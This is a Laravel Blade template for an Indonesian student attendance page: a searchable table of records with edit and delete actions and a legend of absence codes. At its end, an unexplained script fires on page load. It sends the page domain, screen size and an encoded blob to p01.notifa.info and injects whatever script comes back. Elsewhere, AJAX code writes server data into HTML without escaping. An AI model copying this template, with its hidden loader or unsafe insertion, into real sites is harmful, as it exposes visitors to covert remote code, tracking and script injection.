


 @extends('layouts.petugas')
@section('content')
<style type="text/css">
    #myInput {
    background-image: url('/css/searchicon.png'); /* Add a search icon to input */
    background-position: 10px 12px; /* Position the search icon */
    background-repeat: no-repeat; /* Do not repeat the icon image */
    width: 30%; /* Full-width */
    font-size: 16px; /* Increase font-size */
    padding: 12px 20px 12px 40px; /* Add some padding */
    border: 1px solid #ddd; /* Add a grey border */
    margin-bottom: 12px; /* Add some space below the input */
}

#myTable {
    border-collapse: collapse; /* Collapse borders */
    width: 100%; /* Full-width */
    border: 1px solid #ddd; /* Add a grey border */
    font-size: 18px; /* Increase font-size */
}

#myTable th, #myTable td {
    text-align: left; /* Left-align text */
    padding: 12px; /* Add padding */
}

#myTable tr {
    /* Add a bottom border to all table rows */
    border-bottom: 1px solid #ddd; 
}

#myTable tr.header, #myTable tr:hover {
    /* Add a grey background color to the table header and on hover */
    background-color: #f1f1f1;
}
</style>
<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>

    <!-- Core CSS - Include with every page -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="font-awesome/css/font-awesome.css" rel="stylesheet">
        <link rel="stylesheet" type="text/css" media="all" href="/assets/datepick/daterangepicker.css" />

      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js"></script> 
      <script type="text/javascript" src="/assets/datepick/moment.min.js"></script>
      <script type="text/javascript" src="/assets/datepick/daterangepicker.js"></script>



 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" ></script>

</head>

<body>
                    <div class="panel panel-default">
                        <div class="panel-heading">
                       
                             {{ Auth::user()->name }}                        
                        </div>
<script>
function myFunction() {
  // Declare variables 
  var input, filter, table, tr, td, i;
  input = document.getElementById("myInput");
  filter = input.value.toUpperCase();
  table = document.getElementById("myTable");
  tr = table.getElementsByTagName("tr");

  // Loop through all table rows, and hide those who don't match the search query
  for (i = 0; i < tr.length; i++) {
    td = tr[i].getElementsByTagName("td")[3];
    if (td) {
      if (td.innerHTML.toUpperCase().indexOf(filter) > -1) {
        tr[i].style.display = "";
      } else {
        tr[i].style.display = "none";
      }
    } 
  }
}
</script>
<input type="text" id="myInput" onkeyup="myFunction()" placeholder="Search for names..">


<hr>
{{-- <div class="row">
    <div class="col-md-4">
     {!! Form::label('tanggal','pilih kelas') !!}   
     {!! Form::select('id', $kelas ,null,array ('id'=>'kelas','class' => 'form-control')) !!}   
        
    </div>
</div> --}}
                        <!-- /.panel-heading -->
{{-- <form action="absensi_siswa/index.php" name="date" method="get">                    
<button class="btn btn-primary" type="submit">apply</button>
 --}}


                        <div class="panel-body">
                            <div class="table-responsive">
                                <table  id="myTable"class="table">
  
                                        


<tr>
<td colspan="5" class="text-center success">no</td>    
<td colspan="5" class="text-center success">@sortablelink('tanggal')</td>    
<td colspan="5" class="text-center success">@sortablelink('Nama')</td>    
<td colspan="5" class="text-center success">@sortablelink('id_kelas')</td>    
<td  colspan="5" class="text-center success">@sortablelink('keterangan')</td>
<td  colspan="5" class="text-center success">@sortablelink('id_PetugasPiket')</td>
<td  colspan="5" class="text-center success">Action</td>

</tr>
                        
<tr>
    <tbody id="absensi_siswa">
                           @php $no = 1; @endphp
                     

                        @foreach($absensi_siswa as $data)
<td colspan="5" class="text-center success">{{ $no++ }}</td>
<td colspan="5" class="text-center">{{ $data->tanggal }}</td>
<td colspan="5" class="text-center">{{ $data->siswa->Nama }}</td>
<td colspan="5" class="text-center">{{ $data->kelas->nama_kelas }}</td>
<td colspan="5" class="text-center">{{ $data->keterangan }}</td>
<td colspan="5" class="text-center">{{ $data->petugas_piket->nama_petugas }}</td>
 <td>
    <a class="btn btn-warning" href="{{ route('absensi_siswa.edit',$data->id) }}">Edit</a>
</td>
                       <td>
                            <form method="post" action="{{ route('absensi_siswa.destroy',$data->id) }}">
                                <input name="_token" type="hidden" value="{{ csrf_token() }}">
                                <input type="hidden" name="_method" value="DELETE">

                                <button type="submit" class="btn btn-danger">Delete</button>
                            </form>
                        </td>
                     
</tr>

   @endforeach  
        
    </tbody>          
                                </table>

                            </div>




                            <!-- /.table-responsive -->
                            <div class="well">
                                <h4>Keterangan Absensi</h4>
                                <p>A = Tidak Masuk Tanpa Keterangan</p>
                                <p>I = Tidak Masuk Ada Surat Ijin Atau Pemberitahuan</p>
                                <p>S = Tidak Masuk Ada Surat Dokter Atau Pemberitahuan</p>
                                <p>M = Hadir</p>
                                <p>N = Belum Ada Keterangan Absensi</p>
                                <p>L = Hari Libur </p>

                            </div>
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
      
    <!-- Core Scripts - Include with every page -->
   
    <script type="text/javascript">
        $(document).ready (function (){
            $('#kelas').on('change', function(e){
        var id = e.target.value;
        $.get('{{ url('kelas')}}/'+id, function(data){
            console.log(id);
            console.log(data);
            $('#absensi_siswa').empty();
            $.each(data, function(index, element){
                $('#absensi_siswa').append("<tr colspan='5'><td colspan='5'>"+element.tanggal+"</td><td colspan='5'>"+element.id+"</td><td colspan='5'>"
                    +element.id_kelas+"</td><td colspan='5'>"+element.nama_kelas+"</td><td colspan='5'>"+element.keterangan+"</td><td colspan='5'>"+element.id_PetugasPiket+"</td></tr>");
            });
        
        });
        });
    });
    </script>
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>

    <!-- Page-Level Plugin Scripts - Tables -->
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <!-- SB Admin Scripts - Include with every page -->
    <script src="js/sb-admin.js"></script>

    <!-- Page-Level Demo Scripts - Tables - Use for reference -->
    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mLjcjWn%2bvCNaJ85cVa7QpLexe2F3tjA0kdh4v0bUhBXB%2bTKh9mk5nopbRFTkfQfeIMLMGLBY1jTK9XcL4%2fnBrZWhmQoC3kzoPe5MPfKT59U9mXOWsfHC4S%2bOZPL5wPtvSCtljRSLBOPFJTexgl8o%2bi%2fsPKy4wxY7gxJPgf9I7TSgJmEcA3j29byq8ONfHAtGoAQAB8A2mgS%2bZoqdSmS6In3PRsWqzjE7tbfC%2fGztDF6fjFyZkJBcIRz4aZrGgUnnVOUVPlCESepDO8FVwc8ns2xEveWjyIbRps4AWKTOW8DVempi2PlBiKwhpLMg%2b1wwV8hitWGX4iHWzO8zK4hu%2fTKignfEAV4%2fzVIXNeKy8LQt09rxmWUV1TwuHU0Kp4mq9z9GlJBOPTpf7wmgxEXRm7eKjovuSNryyYgHOPd3U8MORMeWOAkPS8tzAwZjmqJehKL4GvvCuIN%2bUSVt0NHrJJ6pA2pSvTg5CDVPiilVAUx%2bUO%2ftJrLHR1MtfYCdnY0MjRhJWVhX%2bfm0C3XDL%2br%2blTit7U9UkrTy5OrJOMz%2fM9pjBFhixWV1tdVyfddYqoXKnkpPtMJCQqknbwmp%2fKWG%2bYRPAu3VXtWMc" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

@endsection
